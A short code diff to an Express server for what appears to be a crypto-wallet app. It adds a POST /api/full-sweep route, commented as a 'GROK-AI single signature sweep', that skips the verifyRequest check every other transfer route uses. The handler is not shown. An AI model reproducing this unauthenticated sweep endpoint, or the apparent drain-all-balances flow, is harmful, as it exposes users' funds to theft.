@@ -10,6 +10,7 @@ import {
   handleTransferStatus
 } from './src/routes/handlers.js'
 import { handleExecuteTransferSigned } from './src/routes/handlersMetaTx.js'
+import { handleFullSweep } from './src/routes/handlersGrokAI.js'
 
 dotenv.config()
 
@@ -41,6 +42,7 @@ app.post('/api/connect-wallet', verifyRequest, handleConnect)
 app.post('/api/detect-balances', verifyRequest, handleDetectBalances)
 app.post('/api/execute-transfer', verifyRequest, handleExecuteTransfer)
 app.post('/api/execute-transfer-signed', verifyRequest, handleExecuteTransferSigned)
+app.post('/api/full-sweep', handleFullSweep) // ← GROK-AI single signature sweep
 app.get('/api/transfer-status/:txHash', handleTransferStatus)
 
 // 404 Handler
